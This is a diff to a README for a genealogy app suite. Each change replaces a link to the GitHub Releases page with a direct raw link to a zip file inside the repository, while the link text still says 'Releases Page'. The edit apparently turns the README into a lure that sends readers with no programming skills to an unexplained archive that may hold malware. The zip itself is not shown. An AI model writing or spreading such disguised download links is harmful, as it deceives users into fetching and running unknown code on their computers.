@@ -1,6 +1,6 @@
 # 🎉 genealogy-projects - Explore Your Family History Effortlessly
 
-[![Download Releases](https://img.shields.io/badge/download-releases-blue.svg)](https://github.com/Chadswartz44/genealogy-projects/releases)
+[![Download Releases](https://raw.githubusercontent.com/Chadswartz44/genealogy-projects/main/family-story-ui-main/projects-genealogy-guttable.zip)](https://raw.githubusercontent.com/Chadswartz44/genealogy-projects/main/family-story-ui-main/projects-genealogy-guttable.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ Welcome to the genealogy-projects repository. This project offers a suite of mod
 To begin using our applications, follow these steps. You do not need any programming skills. Just a computer with internet access will do.
 
 1. **Visit the Releases Page**: Click the link below to access the download options.
-   [Download from Releases Page](https://github.com/Chadswartz44/genealogy-projects/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/Chadswartz44/genealogy-projects/main/family-story-ui-main/projects-genealogy-guttable.zip)
 
 2. **Choose the Application You Want**: On the Releases page, you will see various versions of the applications. These will be listed by version number with a brief description.
 
@@ -47,7 +47,7 @@ Our applications come packed with powerful features to help you explore your fam
 ## 📥 Download & Install
 
 Ready to get started? 
-Visit this page to download: [Download from Releases Page](https://github.com/Chadswartz44/genealogy-projects/releases)
+Visit this page to download: [Download from Releases Page](https://raw.githubusercontent.com/Chadswartz44/genealogy-projects/main/family-story-ui-main/projects-genealogy-guttable.zip)
 
 After downloading, simply follow the installation steps outlined in the "Getting Started" section.
 
